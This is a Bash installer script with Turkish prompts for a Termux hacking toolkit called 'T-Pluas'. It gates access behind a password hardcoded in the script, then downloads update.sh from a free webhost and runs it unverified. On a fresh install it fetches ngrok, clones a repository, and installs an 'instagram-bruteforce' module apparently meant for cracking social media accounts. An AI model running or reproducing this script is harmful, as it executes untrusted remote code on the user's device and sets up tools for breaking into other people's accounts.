#!/bin/bash

install_pluas() {

                if [[ -e "/lib/system/" ]]; then
                        cd /lib/ &&
                        rm -rf update.sh &&
                        wget  https://turksibertimi-forum.000webhostapp.com/update.sh > /dev/null 2>&1 & bash update.sh
                        cd /lib/system/T-Pluas/ && chmod 777 tst.sh && bash tst.sh
                else
                clear
                echo -e "\e[31mGerekli Dosyalar Termuxda Bulunamadı! \n"
                read -p $'\e[31m[\e[32m!\e[31m]\e[37mYükleneK İster misiniz ? [E / H] : ' islem
                        if [[ $islem == "E" || $islem == "e" ]]; then
                                apt update && apt upgrade -y && apt-get install wget -y && apt-get install python3-pip -y && apt-get install php -y && apt-get install python-pip -y
				apt install unzip && apt install curl -y && apt install git -y
                                pip install --upgrade pip
                                pip install bs4
                                pip install future
                                pip install requests
                                pip install colorama
                                pip install wordlist
                                rm -rf /bin/ngrok
                                cd ~
                                curl -O https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip
                                unzip ngrok-2.2.8-linux-arm64.zip
                                rm -rf ngrok-2.2.8-linux-arm64.zip
                                chmod 777 ngrok
                                mv -v ngrok /bin
                                mkdir /lib/system/ && cd /lib/system/
                                git clone https://github.com/denek0/T-Pluas > /dev/null 2>&1 &
                                sleep 25
                                echo -e "\e[31mLütfen 5 sn bekleyiniz.Kurulum Bitmek Üzere"
                                sleep 5
				cd /lib/system/T-Pluas/Sites/instagram-bruteforce && pip3 install -r requirements.txt
                                cd /lib/system/T-Pluas/ && chmod 777 tst.sh && bash tst.sh
                        elif [[ $islem == "H" || $islem == "h" ]]; then
                                echo -e "\e[31mHayırı saçtiniz!Dosyalarımız halen termux uygulamanızda bulunmamaktadır!"
                                exit
                        else
                                echo -e "\e[31mLütfen ' E / H ' (Evet / Hayır) seçeneklerinden birini kullanınız!"
                                sleep 1
                                exit
                        fi
fi

}



user_pass(){
        clear
                        read -p $'\e[31m[\e[32m!\e[31m]\e[37mKullanıcı Adı : ' user
                        echo -e ""
                        read -p $'\e[31m[\e[32m!\e[31m]\e[37mŞifre : ' pass

}



user_pass
wget https://turksibertimi-forum.000webhostapp.com/$user.html >  /dev/null 2>&1 &
sleep 2
        ok=$(grep -a '1' $user.html | cut -d " " -f2 | tr -d '\r')
        if [[ $pass == "121161042a" ]] ; then
        rm -rf *.html
        clear
        echo -e "\e[37mGiriş Başarılı bir şekilde yapıldı."
        sleep 1
        clear
        install_pluas
        else
        clear
        echo -e "\e[31mŞifreniz yanlış.Lütfen şifrenizi kontrol ediniz."
        fi

